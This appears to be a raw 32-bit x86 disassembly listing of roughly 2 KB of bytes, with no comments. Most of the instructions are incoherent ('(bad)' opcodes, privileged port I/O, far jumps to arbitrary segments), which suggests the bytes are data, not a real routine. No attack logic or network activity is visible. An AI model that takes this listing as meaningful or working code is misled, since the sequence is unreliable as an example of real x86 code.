  41f0a6:	push   0x7fbf79e2
  41f0ab:	pushf  
  41f0ac:	arpl   WORD PTR [edi+edi*1+0x17c1261c],bp
  41f0b3:	arpl   WORD PTR [ebx],si
  41f0b5:	cmc    
  41f0b6:	data16 hlt 
  41f0b8:	cmc    
  41f0b9:	dec    esp
  41f0ba:	mov    ecx,0xc75c8bb3
  41f0bf:	cs jl  0x41f0c4
  41f0c2:	pop    esp
  41f0c3:	pop    ds
  41f0c4:	push   edi
  41f0c5:	shl    BYTE PTR [edi-0x600c7d62],1
  41f0cb:	push   ds
  41f0cc:	jno    0x41f069
  41f0ce:	inc    edx
  41f0cf:	inc    esi
  41f0d0:	inc    ebx
  41f0d1:	rol    DWORD PTR [esi],1
  41f0d3:	sub    DWORD PTR [ebp+0x40],ebp
  41f0d6:	push   0x5f
  41f0d8:	jp     0x41f153
  41f0da:	cmp    DWORD PTR [ecx-0x7362c06b],edi
  41f0e0:	inc    ebx
  41f0e1:	mov    WORD PTR [ebp-0x56],ss
  41f0e4:	out    0x3d,al
  41f0e6:	repnz outs dx,DWORD PTR ds:[esi]
  41f0e8:	jmp    0xfa5b72d1
  41f0ed:	mov    esi,0x51d72f51
  41f0f2:	sub    al,0x6e
  41f0f4:	loop   0x41f0d9
  41f0f6:	pop    eax
  41f0f7:	fwait
  41f0f8:	lods   eax,DWORD PTR ds:[esi]
  41f0f9:	dec    ebx
  41f0fa:	bnd jle 0x41f15c
  41f0fd:	cld    
  41f0fe:	mov    bl,0xad
  41f100:	rcl    BYTE PTR [edx+0x52ece112],0x41
  41f107:	(bad)  
  41f108:	pop    edi
  41f109:	xchg   edx,eax
  41f10a:	mov    eax,edi
  41f10c:	out    0x26,eax
  41f10e:	aas    
  41f10f:	push   edi
  41f110:	sbb    BYTE PTR [ebx+eax*4-0x52],bh
  41f114:	mov    ds:0x70a05f4f,al
  41f119:	lds    ebp,FWORD PTR gs:[esi+0x7847e347]
  41f120:	rcr    DWORD PTR [ecx-0x1ad57b8f],0x9f
  41f127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f128:	push   esi
  41f129:	mov    cs,WORD PTR [edx]
  41f12b:	sbb    al,0x9a
  41f12d:	mov    eax,ds:0xcded0d8
  41f132:	adc    ebp,edi
  41f134:	inc    ebp
  41f135:	rol    DWORD PTR [edx+0x57442bdd],1
  41f13b:	push   0x10
  41f13d:	test   ah,ah
  41f13f:	shl    BYTE PTR [esi-0x80],0x37
  41f143:	jecxz  0x41f195
  41f145:	xchg   BYTE PTR [ecx],ah
  41f147:	jne    0x41f0ff
  41f149:	cli    
  41f14a:	dec    ecx
  41f14b:	adc    al,0x63
  41f14d:	popf   
  41f14e:	push   esi
  41f14f:	push   ds
  41f150:	mov    eax,0x60f92a4e
  41f155:	sub    al,0x39
  41f157:	jbe    0x41f0df
  41f159:	pop    ds
  41f15a:	(bad)  
  41f15b:	cmp    DWORD PTR [esi-0x1b],ebx
  41f15e:	outs   dx,BYTE PTR ds:[esi]
  41f15f:	mov    eax,0x34ad0360
  41f164:	pusha  
  41f165:	(bad)  
  41f166:	adc    DWORD PTR [ebx],ecx
  41f168:	add    al,dh
  41f16a:	rol    BYTE PTR [eax-0x74],1
  41f16d:	adc    eax,0x21c37396
  41f172:	scas   eax,DWORD PTR es:[edi]
  41f173:	in     eax,0x87
  41f175:	pusha  
  41f176:	pop    ds
  41f177:	js     0x41f10e
  41f179:	xchg   DWORD PTR [edi-0x65],esi
  41f17c:	das    
  41f17d:	or     eax,0x9fd56a71
  41f182:	and    eax,0x9c21db07
  41f187:	jb     0x41f1b0
  41f189:	cmp    al,0xe7
  41f18b:	les    ebp,FWORD PTR [esi+0x633b9eba]
  41f191:	(bad)  
  41f192:	out    dx,al
  41f193:	mov    edx,esp
  41f195:	nop
  41f196:	sub    BYTE PTR [edx+0x5a05d867],0xa
  41f19d:	xor    ch,dl
  41f19f:	push   edx
  41f1a0:	pop    edx
  41f1a1:	cmp    eax,0x2547826
  41f1a6:	aas    
  41f1a7:	dec    edi
  41f1a8:	mov    edx,0xeac1174b
  41f1ad:	(bad)  
  41f1ae:	and    edx,eax
  41f1b0:	sbb    eax,0x96cf533
  41f1b5:	inc    edi
  41f1b6:	pop    ecx
  41f1b7:	in     eax,0x4d
  41f1b9:	push   0x7f
  41f1bb:	and    esp,DWORD PTR [edi]
  41f1bd:	xlat   BYTE PTR ds:[ebx]
  41f1be:	jbe    0x41f1f9
  41f1c0:	lahf   
  41f1c1:	outs   dx,DWORD PTR ds:[esi]
  41f1c2:	or     al,0xd7
  41f1c4:	dec    esp
  41f1c5:	jmp    0xada7a0fb
  41f1ca:	dec    ecx
  41f1cb:	jmp    0x41f1f2
  41f1cd:	adc    DWORD PTR [ecx],eax
  41f1cf:	mov    al,ds:0xfa9f7f0f
  41f1d4:	mov    cl,0x23
  41f1d6:	fidiv  DWORD PTR [ebp-0x149fb1d2]
  41f1dc:	mov    esi,0x72eade11
  41f1e1:	dec    edi
  41f1e2:	push   edx
  41f1e3:	call   0xff93:0x730d4cce
  41f1ea:	ins    BYTE PTR es:[edi],dx
  41f1eb:	outs   dx,DWORD PTR ds:[esi]
  41f1ec:	adc    ebx,esi
  41f1ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1ef:	xchg   edi,eax
  41f1f0:	popf   
  41f1f1:	push   esi
  41f1f2:	lds    eax,FWORD PTR [ebx-0x57654fa0]
  41f1f8:	dec    edi
  41f1f9:	data16 stc 
  41f1fb:	mov    dh,0xa3
  41f1fd:	xor    eax,0x86a1e0c
  41f202:	pop    ss
  41f203:	mov    al,ds:0x96d02325
  41f208:	in     al,dx
  41f209:	add    al,BYTE PTR [ecx+0x2b067825]
  41f20f:	cld    
  41f210:	enter  0x6be9,0x28
  41f214:	adc    DWORD PTR [ecx],edx
  41f216:	loope  0x41f256
  41f218:	xchg   esp,eax
  41f219:	mov    ?,WORD PTR [ebx+0x738b2d08]
  41f21f:	bound  eax,QWORD PTR [edx+0x4726ee39]
  41f225:	inc    edx
  41f226:	(bad)  [esi-0x41]
  41f229:	repnz scas al,BYTE PTR es:[edi]
  41f22b:	aaa    
  41f22c:	mov    bh,0xa9
  41f22e:	in     al,0xfc
  41f230:	shl    DWORD PTR [edx+0x1a],0xa3
  41f234:	ss hlt 
  41f236:	pop    eax
  41f237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f238:	inc    edx
  41f239:	ret    0x9e44
  41f23c:	rol    ah,1
  41f23e:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41f240:	mov    DWORD PTR [ebx+0x76],esi
  41f243:	sbb    DWORD PTR [eax+0x0],ebx
	...
  41f251:	xor    dl,al
  41f253:	and    ecx,ebp
  41f255:	repz jmp 0x41f250
  41f258:	fcmovnb st,st(3)
  41f25a:	pop    ebp
  41f25b:	sbb    DWORD PTR [ecx-0x4b],ebx
  41f25e:	scas   al,BYTE PTR es:[edi]
  41f25f:	cmp    ebx,DWORD PTR [ebp+0x2d]
  41f262:	ins    DWORD PTR es:[edi],dx
  41f263:	add    DWORD PTR [eax],eax
  41f265:	lods   al,BYTE PTR ds:[esi]
  41f266:	add    eax,DWORD PTR [eax]
  41f268:	add    BYTE PTR [esi],ch
  41f26a:	mov    esp,0x127952ce
  41f26f:	mov    dl,0xc6
  41f271:	and    al,0xb
  41f273:	push   cs
  41f274:	lahf   
  41f275:	push   esp
  41f276:	aam    0x8f
  41f278:	aas    
  41f279:	dec    eax
  41f27a:	stos   BYTE PTR es:[edi],al
  41f27b:	maxps  xmm6,XMMWORD PTR [esi+0x29]
  41f27f:	ja     0x41f257
  41f281:	arpl   WORD PTR [ecx],cx
  41f283:	js     0x41f26e
  41f285:	add    eax,0x5ba8713f
  41f28a:	adc    eax,DWORD PTR [ebx-0x51]
  41f28d:	test   eax,0xb121904c
  41f292:	loop   0x41f2a8
  41f294:	mov    edi,0x4675fabc
  41f299:	mov    bh,0x52
  41f29b:	imul   esi,eax,0xffffffc0
  41f29e:	jbe    0x41f255
  41f2a0:	add    al,BYTE PTR [ebx+0x58]
  41f2a3:	imul   BYTE PTR ds:0x3c123934
  41f2a9:	pop    ds
  41f2aa:	xchg   ebp,eax
  41f2ab:	jp     0x41f2ce
  41f2ad:	or     dl,BYTE PTR [eax-0x5ef06de5]
  41f2b3:	inc    edi
  41f2b4:	in     eax,dx
  41f2b5:	jne    0x41f286
  41f2b7:	adc    cl,al
  41f2b9:	jle    0x41f2b1
  41f2bb:	dec    edi
  41f2bc:	add    cl,bh
  41f2be:	adc    ecx,esp
  41f2c0:	lds    edx,FWORD PTR [esi]
  41f2c2:	jmp    0x41f280
  41f2c4:	dec    ecx
  41f2c5:	xchg   ecx,eax
  41f2c6:	sub    ebp,DWORD PTR [edx+ebp*1-0x298f76df]
  41f2cd:	dec    eax
  41f2ce:	fdivr  QWORD PTR [edi-0x6d3c6f59]
  41f2d4:	pusha  
  41f2d5:	jecxz  0x41f320
  41f2d7:	or     al,BYTE PTR [edi]
  41f2d9:	fwait
  41f2da:	(bad)  
  41f2db:	push   0x6087e885
  41f2e0:	push   es
  41f2e1:	mov    edi,0x7571a0a0
  41f2e6:	mov    ch,0xc
  41f2e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2e9:	inc    edx
  41f2ea:	cmp    eax,0x178e4b97
  41f2ef:	xchg   edi,eax
  41f2f0:	mov    al,ds:0x7248f2d0
  41f2f5:	mov    al,0x26
  41f2f7:	jo     0x41f2c2
  41f2f9:	cdq    
  41f2fa:	(bad)  
  41f2fb:	and    ah,BYTE PTR [edx-0x71]
  41f2fe:	retf   0x3424
  41f301:	mov    esi,0x2fff2637
  41f306:	imul   ebx,DWORD PTR ds:0x3113f36d,0x4daa1ab2
  41f310:	sti    
  41f311:	test   dh,ch
  41f313:	mov    ah,bh
  41f315:	std    
  41f316:	push   cs
  41f317:	adc    al,0xc2
  41f319:	mov    WORD PTR ds:0xbe317127,ds
  41f31f:	not    ecx
  41f321:	and    DWORD PTR [esi-0x29c40de1],esp
  41f327:	pop    edi
  41f328:	sbb    BYTE PTR [ebp+0x41],ch
  41f32b:	ds pop esi
  41f32e:	clc    
  41f32f:	das    
  41f330:	pop    ecx
  41f331:	mov    eax,0x693657f1
  41f336:	sub    BYTE PTR [esi+0x32],ah
  41f339:	add    DWORD PTR [edx-0x769430f9],ebp
  41f33f:	pop    ebp
  41f340:	mov    eax,0xb2eae460
  41f345:	arpl   WORD PTR [ecx-0x7fb51b2],di
  41f34b:	xor    esi,DWORD PTR ss:[eax+ebp*4]
  41f34f:	xchg   edi,eax
  41f350:	fst    st(7)
  41f352:	push   eax
  41f353:	imul   ecx,esi,0x7f
  41f356:	pop    ebx
  41f357:	out    dx,eax
  41f358:	lock cli 
  41f35a:	or     al,0xeb
  41f35c:	sti    
  41f35d:	inc    ecx
  41f35e:	cmp    eax,0x8729d039
  41f363:	fadd   DWORD PTR [eax+ebp*1+0x45]
  41f367:	out    dx,al
  41f368:	mov    cl,0xba
  41f36a:	sub    al,0xf0
  41f36c:	cdq    
  41f36d:	or     eax,0x8d6fac6e
  41f372:	xchg   BYTE PTR [eax+eiz*1+0x3],cl
  41f376:	xchg   BYTE PTR [esi+0x7181d52d],al
  41f37c:	jmp    0xc092:0xd0269342
  41f383:	inc    esp
  41f384:	sbb    BYTE PTR [edx+0x7e],ah
  41f387:	inc    esp
  41f388:	(bad)  
  41f389:	addr16 jno 0x41f310
  41f38c:	scas   al,BYTE PTR es:[edi]
  41f38d:	ins    DWORD PTR es:[edi],dx
  41f38e:	ds cld 
  41f390:	pushf  
  41f391:	fadd   st,st(4)
  41f393:	mov    eax,0x11fffda5
  41f398:	mov    ah,0x8f
  41f39a:	outs   dx,DWORD PTR ds:[esi]
  41f39b:	dec    edx
  41f39c:	iret   
  41f39d:	and    DWORD PTR [esi+0x6f2b0279],ebx
  41f3a3:	cli    
  41f3a4:	shl    BYTE PTR gs:[ecx+0x19beb33b],0x61
  41f3ac:	jb     0x41f36b
  41f3ae:	dec    eax
  41f3af:	add    dh,dh
  41f3b1:	imul   ebx,esi,0x31004e83
  41f3b7:	push   ecx
  41f3b8:	loope  0x41f3f3
  41f3ba:	scas   eax,DWORD PTR es:[edi]
  41f3bb:	add    eax,0xcf749aa0
  41f3c0:	sar    BYTE PTR [ebp+0x76723ef8],0x6e
  41f3c7:	icebp  
  41f3c8:	pop    ss
  41f3c9:	daa    
  41f3ca:	xchg   esp,eax
  41f3cb:	dec    ecx
  41f3cc:	imul   ebp,DWORD PTR [esp+eax*1-0x73],0xffffffa7
  41f3d1:	mov    ebx,0x8d4ab50e
  41f3d6:	and    DWORD PTR [esi],ebx
  41f3d8:	icebp  
  41f3d9:	repz call 0x27d6:0x5c153869
  41f3e1:	xchg   ch,cl
  41f3e3:	sbb    BYTE PTR [ecx-0x1a496b15],al
  41f3e9:	lds    esp,FWORD PTR [eax]
  41f3eb:	retf   
  41f3ec:	adc    edx,ebp
  41f3ee:	ret    0x4de1
  41f3f1:	xchg   edi,eax
  41f3f2:	push   0xffffffb9
  41f3f4:	xor    eax,0x76435acb
  41f3f9:	mov    es,WORD PTR [ecx-0x4d]
  41f3fc:	mov    al,0x17
  41f3fe:	outs   dx,DWORD PTR ds:[esi]
  41f3ff:	xor    edi,DWORD PTR [ecx-0x71]
  41f402:	sti    
  41f403:	xor    edi,DWORD PTR [edx-0x52]
  41f406:	jno    0x41f3e6
  41f408:	pop    ebx
  41f409:	and    al,0x13
  41f40b:	stos   DWORD PTR es:[edi],eax
  41f40c:	xchg   ebp,eax
  41f40d:	sub    eax,0x8819e178
  41f412:	push   edx
  41f413:	icebp  
  41f414:	push   esp
  41f415:	repnz mov dl,0x4
  41f418:	mov    dl,BYTE PTR [ebp+0x50634beb]
  41f41e:	mov    bl,0xac
  41f420:	lahf   
  41f421:	mov    ecx,0x59522cc1
  41f426:	or     eax,0x380436e1
  41f42b:	stc    
  41f42c:	(bad)  
  41f42d:	mov    dl,0xc4
  41f42f:	fld    DWORD PTR [edi+0x1b]
  41f432:	bound  eax,QWORD PTR [edi*4-0x62d1a61c]
  41f439:	mov    DWORD PTR [ebx+0x5cc6fc48],0x975e079f
  41f443:	lds    edi,FWORD PTR [esi]
  41f445:	inc    eax
  41f446:	sub    esp,DWORD PTR [edx-0x14]
  41f449:	jae    0x41f463
  41f44b:	aam    0x19
  41f44d:	(bad)  
  41f44e:	ins    DWORD PTR es:[edi],dx
  41f44f:	inc    ebp
  41f450:	sub    al,0xca
  41f452:	mov    ch,0x52
  41f454:	push   ss
  41f455:	or     BYTE PTR [esi+0x32],cl
  41f458:	mov    esp,0x1a93500
  41f45d:	retf   0x44
  41f460:	sub    eax,0xd220d34f
  41f465:	push   edx
  41f466:	jg     0x41f490
  41f468:	jecxz  0x41f4a3
  41f46a:	stos   BYTE PTR es:[edi],al
  41f46b:	pusha  
  41f46c:	and    DWORD PTR [eax+edi*4+0x3fb447d4],0x2e19c39c
  41f477:	stc    
  41f478:	push   ds
  41f479:	xor    al,0xec
  41f47b:	stc    
  41f47c:	push   edx
  41f47d:	inc    ebp
  41f47e:	xchg   ebp,eax
  41f47f:	pop    edx
  41f480:	in     eax,0xc9
  41f482:	(bad)  
  41f483:	leave  
  41f484:	outs   dx,BYTE PTR ds:[esi]
  41f485:	sub    cl,BYTE PTR [esi]
  41f487:	cmp    al,0x71
  41f489:	retf   
  41f48a:	xchg   BYTE PTR [edx+0x4f0fbf6],ah
  41f490:	retf   0x6f17
  41f493:	sub    dx,WORD PTR [edx+0x51f96d09]
  41f49a:	std    
  41f49b:	push   edi
  41f49c:	jb     0x41f471
  41f49e:	mul    BYTE PTR [edx-0x286ad529]
  41f4a4:	sbb    ebx,DWORD PTR [edx+0xc]
  41f4a7:	sub    eax,0xa41bb081
  41f4ac:	ror    DWORD PTR [edx],cl
  41f4ae:	popa   
  41f4af:	loope  0x41f496
  41f4b1:	xor    al,BYTE PTR [ecx-0x5ac7fb40]
  41f4b7:	mov    dh,0xc2
  41f4b9:	dec    edi
  41f4ba:	mov    dl,0x3a
  41f4bc:	ins    BYTE PTR es:[edi],dx
  41f4bd:	retf   
  41f4be:	loope  0x41f456
  41f4c0:	xor    eax,0x858c2d6f
  41f4c5:	mov    cl,BYTE PTR [esi+0x6b509995]
  41f4cb:	or     BYTE PTR [eax],cl
  41f4cd:	rol    BYTE PTR ds:0xedc55a2,cl
  41f4d3:	inc    esi
  41f4d4:	inc    eax
  41f4d5:	jae    0x41f4f7
  41f4d7:	out    dx,al
  41f4d8:	mov    ah,0xe0
  41f4da:	xchg   edx,eax
  41f4db:	pop    edi
  41f4dc:	sbb    DWORD PTR [eax-0x77],ebx
  41f4df:	xchg   esi,eax
  41f4e0:	fstp   QWORD PTR [edi+0xb122d41]
  41f4e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4e7:	jmp    0x9284:0x5598a6b8
  41f4ee:	and    al,BYTE PTR [eax+0x43e8ffd2]
  41f4f4:	ret    0xdaf5
  41f4f7:	iret   
  41f4f8:	pusha  
  41f4f9:	loop   0x41f4e4
  41f4fb:	test   BYTE PTR [edx+0x7c],dl
  41f4fe:	add    dl,BYTE PTR ds:0x629233e2
  41f504:	mov    bh,ah
  41f506:	mov    esi,0xaccab900
  41f50b:	leave  
  41f50c:	xchg   edi,eax
  41f50d:	scas   eax,DWORD PTR es:[edi]
  41f50e:	sub    al,0xf5
  41f510:	div    dh
  41f512:	cmp    BYTE PTR [edx+0x2e],ch
  41f515:	sbb    DWORD PTR [edx],esp
  41f517:	(bad)  
  41f518:	data16 ins BYTE PTR es:[edi],dx
  41f51a:	xor    DWORD PTR [ebp-0x179a5a2e],ebx
  41f520:	mov    edi,0x7fe20b93
  41f525:	ror    DWORD PTR [eax+0x18a6001d],cl
  41f52b:	push   0xffffff92
  41f52d:	xchg   edi,eax
  41f52e:	or     eax,0x63ec5361
  41f533:	and    bh,bl
  41f535:	cmc    
  41f536:	mov    ebp,0xc601d5eb
  41f53b:	daa    
  41f53c:	jne    0x41f576
  41f53e:	xor    al,0xb5
  41f540:	loope  0x41f5b5
  41f542:	out    dx,eax
  41f543:	jl     0x41f572
  41f545:	mov    ebp,0x7c502e1b
  41f54a:	loop   0x41f520
  41f54c:	sti    
  41f54d:	mov    edx,0x8d8b25d2
  41f552:	rcl    DWORD PTR [ecx],cl
  41f554:	and    ch,BYTE PTR [ecx]
  41f556:	or     cl,BYTE PTR es:[edi+0x72]
  41f55a:	bound  esp,QWORD PTR [ecx+0x2d06344f]
  41f560:	or     DWORD PTR ds:0x415f1f19,ebx
  41f566:	add    ebp,ebp
  41f568:	pop    ecx
  41f569:	mov    ch,dh
  41f56b:	retf   
  41f56c:	rcl    BYTE PTR [ebx],0xe4
  41f56f:	mov    ecx,0x78a5cdfd
  41f574:	or     eax,0x47fea447
  41f579:	pop    ebp
  41f57a:	icebp  
  41f57b:	mov    esi,0x581789f1
  41f580:	(bad)  
  41f582:	adc    BYTE PTR [ebp+0x22823b0c],0xe2
  41f589:	adc    bl,dh
  41f58b:	(bad)  
  41f58c:	fadd   QWORD PTR [esi]
  41f58e:	stc    
  41f58f:	sbb    esi,edx
  41f591:	cdq    
  41f592:	xchg   ebp,eax
  41f593:	pop    eax
  41f594:	es sub esi,esi
  41f597:	mov    ebx,ecx
  41f599:	cmc    
  41f59a:	(bad)  
  41f59b:	cld    
  41f59c:	add    BYTE PTR [esi-0x662447f2],dl
  41f5a2:	(bad)  
  41f5a3:	std    
  41f5a4:	inc    eax
  41f5a5:	in     eax,0x6e
  41f5a7:	xor    edi,eax
  41f5a9:	je     0x9a15fe60
  41f5af:	test   DWORD PTR [edi+0xf40a0e5],0xf230b47d
  41f5b9:	hlt    
  41f5ba:	test   eax,0x5b103936
  41f5bf:	js     0x41f5a5
  41f5c1:	mov    bl,0xf9
  41f5c3:	stos   BYTE PTR es:[edi],al
  41f5c4:	imul   DWORD PTR [esi]
  41f5c6:	xor    esp,edi
  41f5c8:	aad    0x89
  41f5ca:	inc    ecx
  41f5cb:	(bad)  
  41f5cc:	scas   al,BYTE PTR es:[edi]
  41f5cd:	inc    edx
  41f5ce:	cmc    
  41f5cf:	aas    
  41f5d0:	sbb    DWORD PTR [edi+0x12288fa3],edx
  41f5d6:	push   eax
  41f5d7:	push   ebx
  41f5d8:	popf   
  41f5d9:	mov    edi,0x3909d2d
  41f5de:	shl    BYTE PTR [edi-0x175b1e0c],1
  41f5e4:	mov    al,ds:0xef07e58b
  41f5e9:	pop    ebp
  41f5ea:	mov    edi,DWORD PTR [edx]
  41f5ec:	pop    esi
  41f5ed:	dec    eax
  41f5ee:	sbb    ebx,DWORD PTR [ebp+edi*2+0x4f4ffb9a]
  41f5f5:	jbe    0x41f632
  41f5f7:	or     DWORD PTR [ecx],esp
  41f5f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5fa:	mov    BYTE PTR [edi-0x3f92a618],bl
  41f600:	cmp    bh,BYTE PTR [edi-0x68]
  41f603:	xlat   BYTE PTR ds:[ebx]
  41f604:	jge    0x41f5a6
  41f606:	dec    ebp
  41f607:	arpl   WORD PTR [ebx],ax
  41f609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f60a:	jp     0x41f59d
  41f60c:	and    DWORD PTR [eax*8+0x5d210a08],ebp
  41f613:	xchg   esi,eax
  41f614:	outs   dx,DWORD PTR ds:[esi]
	...
  41f621:	inc    edx
  41f622:	add    eax,0x65676020
  41f627:	inc    edx
  41f628:	daa    
  41f629:	sti    
  41f62a:	mov    ch,0xb1
  41f62c:	push   edx
  41f62d:	inc    esi
  41f62e:	cwde   
  41f62f:	mov    BYTE PTR [ebx+0x170d9],al
  41f635:	lods   al,BYTE PTR ds:[esi]
  41f636:	add    eax,DWORD PTR [eax]
  41f638:	add    BYTE PTR [ecx+0x4e],bl
  41f63b:	sbb    esp,0xffffffa7
  41f63e:	fdivr  DWORD PTR [ebp-0x61]
  41f641:	(bad)  
  41f642:	jg     0x41f658
  41f644:	jecxz  0x41f69b
  41f646:	aas    
  41f647:	in     eax,dx
  41f648:	jno    0x41f695
  41f64a:	cwde   
  41f64b:	icebp  
  41f64c:	jns    0x41f67d
  41f64e:	imul   ebp,DWORD PTR [edi],0xffffffe0
  41f651:	and    edi,DWORD PTR [edx+0x301e5c4b]
  41f657:	popf   
  41f658:	(bad)  
  41f659:	adc    esi,edx
  41f65b:	jge    0x41f6c1
  41f65d:	inc    edx
  41f65e:	sub    DWORD PTR [edi-0x5133d8e7],edx
  41f664:	into   
  41f665:	push   ds
  41f666:	mov    gs,WORD PTR [edi]
  41f668:	cli    
  41f669:	mov    dl,0x21
  41f66b:	inc    esi
  41f66c:	pop    DWORD PTR [ebx-0x37]
  41f66f:	add    al,0xab
  41f671:	(bad)  
  41f672:	pop    eax
  41f673:	ins    DWORD PTR es:[edi],dx
  41f674:	sub    eax,0x956fb6cd
  41f679:	mov    DWORD PTR [eax],ecx
  41f67b:	das    
  41f67c:	mov    ds:0x9322cdf2,eax
  41f681:	pop    esi
  41f682:	scas   eax,DWORD PTR es:[edi]
  41f683:	fdivrp st(1),st
  41f685:	ins    BYTE PTR es:[edi],dx
  41f686:	sbb    eax,0x15d677f0
  41f68b:	sub    eax,0x1da914c9
  41f690:	lea    ebx,[edx+0x2b]
  41f693:	and    al,BYTE PTR [esi-0x942e1d1]
  41f699:	sbb    al,0x2e
  41f69b:	adc    cl,BYTE PTR [ebx+ecx*8-0x53]
  41f69f:	retf   0x2626
  41f6a2:	lea    edi,[eax-0x728fc977]
  41f6a8:	xchg   ebp,eax
  41f6a9:	retf   0xf7f
  41f6ac:	popf   
  41f6ad:	push   0x203f8ca
  41f6b2:	xor    DWORD PTR [edi-0x70],0xc6a685d9
  41f6b9:	dec    ebp
  41f6ba:	(bad)  
  41f6bb:	and    dl,BYTE PTR [esi]
  41f6bd:	push   ecx
  41f6be:	test   al,0xb
  41f6c0:	jp     0x41f650
  41f6c2:	lods   al,BYTE PTR ds:[esi]
  41f6c3:	adc    DWORD PTR [ebp-0x34],esi
  41f6c6:	inc    ebp
  41f6c7:	sbb    eax,0x51930610
  41f6cc:	popf   
  41f6cd:	or     eax,0xf24860a4
  41f6d2:	retf   
  41f6d3:	pop    ds
  41f6d4:	ficom  WORD PTR [esi-0x1f]
  41f6d7:	xor    ch,BYTE PTR [edi+0x2c4852d6]
  41f6dd:	ret    
  41f6de:	fcomip st,st(4)
  41f6e0:	mov    ecx,0x5f0a3520
  41f6e5:	fnsave [ebx+0x64a7f0ac]
  41f6eb:	sub    BYTE PTR [ebp-0x46],dl
  41f6ee:	test   al,0x2d
  41f6f0:	mov    al,0xd8
  41f6f2:	outs   dx,DWORD PTR ds:[esi]
  41f6f3:	je     0x41f67e
  41f6f5:	mov    DWORD PTR [ebx+0x64],edx
  41f6f8:	ins    DWORD PTR es:[edi],dx
  41f6f9:	arpl   WORD PTR [ebx],ax
  41f6fb:	sbb    eax,0x3d7c26d6
  41f700:	lea    ebx,[edx-0x4be39567]
  41f706:	mov    edx,0x695cdbfa
  41f70b:	sub    DWORD PTR [edx+0x49],esp
  41f70e:	push   edx
  41f70f:	shr    BYTE PTR [edx+0x473f8ab9],0xef
  41f716:	jbe    0x41f6b7
  41f718:	dec    ecx
  41f719:	xchg   ecx,eax
  41f71a:	inc    esp
  41f71b:	jo     0x41f76a
  41f71d:	dec    ebp
  41f71e:	mov    eax,0xd55ebed4
  41f723:	pop    edi
  41f724:	and    al,BYTE PTR [ebx+0x2a1a8044]
  41f72a:	pop    ss
  41f72b:	out    dx,al
  41f72c:	test   al,0xf5
  41f72e:	add    DWORD PTR [esi],edx
  41f730:	xchg   ebp,eax
  41f731:	aad    0xef
  41f733:	mov    al,0x11
  41f735:	ss pop ecx
  41f737:	pop    eax
  41f738:	imul   esp,DWORD PTR [edx],0x660daf23
  41f73e:	xor    al,0xd9
  41f740:	jns    0x41f7af
  41f742:	mov    WORD PTR [edx-0x27af24ed],ds
  41f748:	call   0x6aef8011
  41f74d:	int    0x2e
  41f74f:	sar    DWORD PTR [edx+0x261cc3fb],1
  41f755:	xchg   edx,edi
  41f757:	push   ss
  41f758:	jp     0x41f797
  41f75a:	das    
  41f75b:	or     edx,DWORD PTR [ecx+0x307e9064]
  41f761:	xor    dl,BYTE PTR ds:0xb152e41e
  41f767:	push   ebx
  41f768:	adc    dl,al
  41f76a:	pop    edi
  41f76b:	push   es
  41f76c:	push   ds
  41f76d:	mov    ch,0xd
  41f76f:	mov    edx,0xdf0d12b9
  41f774:	cmp    DWORD PTR [ecx],ebx
  41f776:	stos   DWORD PTR es:[edi],eax
  41f777:	lds    ebx,FWORD PTR [edx+0x23]
  41f77a:	pop    ebp
  41f77b:	xor    BYTE PTR ds:0xc68e03c2,cl
  41f781:	imul   edi,ebx,0x54801632
  41f787:	xchg   BYTE PTR [ebx-0x41],ah
  41f78a:	inc    esi
  41f78b:	popf   
  41f78c:	(bad)  
  41f78d:	or     ebx,DWORD PTR [ebp+0x1c]
  41f790:	lea    esp,[ebx+0x118fa0d4]
  41f796:	adc    BYTE PTR [ebp+0x280f1855],bl
  41f79c:	sub    BYTE PTR [eax+ecx*8+0x35],dl
  41f7a0:	jmp    0x41f7ae
  41f7a2:	pop    edx
  41f7a3:	mov    dl,0xa1
  41f7a5:	or     ah,BYTE PTR [ecx+0x79]
  41f7a8:	or     DWORD PTR [edi],edx
  41f7aa:	dec    ecx
  41f7ab:	jo     0x41f746
  41f7ad:	push   edx
  41f7ae:	jbe    0x41f7d4
  41f7b0:	stc    
  41f7b1:	or     DWORD PTR [edi-0x40],ebp
  41f7b4:	cmc    
  41f7b5:	mov    ecx,0x8146e672
  41f7ba:	and    BYTE PTR [esp+eiz*2-0x38d95c68],bl
  41f7c1:	ret    
  41f7c2:	das    
  41f7c3:	loop   0x41f7d5
  41f7c5:	jp     0x41f7e8
  41f7c7:	push   edi
  41f7c8:	(bad)  
  41f7c9:	test   al,0xac
  41f7cb:	mov    ecx,0xa7a0eb57
  41f7d0:	push   es
  41f7d1:	or     BYTE PTR [edx-0x53a96116],ch
  41f7d7:	cmc    
  41f7d8:	rcl    BYTE PTR [ebp-0x64],1
  41f7db:	mov    ch,0x1f
  41f7dd:	sbb    BYTE PTR [edx-0x41],bh
  41f7e0:	or     eax,0x7eddac68
  41f7e5:	in     al,0xca
  41f7e7:	arpl   WORD PTR ds:0x8e7ab670,si
  41f7ed:	arpl   WORD PTR [esi+esi*2],dx
  41f7f0:	sub    eax,0xc6041a82
  41f7f5:	aam    0xa
  41f7f7:	jle    0x41f837
  41f7f9:	push   ecx
  41f7fa:	pop    edi
  41f7fb:	pop    es
  41f7fc:	test   DWORD PTR [esi-0x5c04f359],ecx
  41f802:	cs jp  0x41f7f5
  41f805:	cmp    eax,0x22c77a9e
  41f80a:	js     0x41f816
  41f80c:	jl     0x41f7f2
  41f80e:	je     0x41f79d
  41f810:	test   BYTE PTR ds:0x9fe0b4cd,dh
  41f816:	mov    eax,ds:0xc1666cc6
  41f81b:	adc    al,ch
  41f81d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f81e:	pop    eax
  41f81f:	pusha  
  41f820:	mov    ds:0x20649f70,eax
  41f825:	int    0x4d
  41f827:	lds    eax,FWORD PTR [bx+si+0x5c]
  41f82b:	xor    dh,BYTE PTR [eax]
  41f82d:	ins    DWORD PTR es:[edi],dx
  41f82e:	aas    
  41f82f:	mov    bl,0x79
  41f831:	sub    al,ch
  41f833:	dec    ebp
  41f834:	sbb    eax,edx
